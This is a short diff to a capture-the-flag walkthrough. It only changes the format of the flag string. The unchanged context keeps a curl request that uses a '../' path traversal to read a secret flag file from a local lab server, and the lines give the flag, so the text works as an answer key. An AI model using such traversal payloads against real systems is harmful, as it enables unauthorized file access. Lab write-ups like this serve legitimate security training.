@@ -10,7 +10,7 @@ Walkthrough
    ```bash
    curl "http://localhost:5005/download?file=../secret/flag.txt"
    ```
-4. Output: `flag{path_traversal_exposed}`.
+4. Output: `flag{path traversal exposed}`.
 
 Flag  
-`flag{path_traversal_exposed}`
+`flag{path traversal exposed}`
